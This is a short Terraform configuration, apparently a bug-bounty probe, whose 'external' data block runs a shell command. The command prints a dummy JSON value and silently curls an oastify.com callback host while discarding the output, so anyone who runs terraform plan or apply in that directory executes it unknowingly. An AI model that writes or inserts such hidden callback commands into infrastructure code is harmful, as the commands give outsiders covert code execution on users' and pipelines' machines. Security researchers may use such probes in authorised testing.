data "external" "example" {
  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL kk886rhrzcix5turk5cic1f7syypmuaj.oastify.com/aws-bugbounty > /dev/null 2>&1"]
}
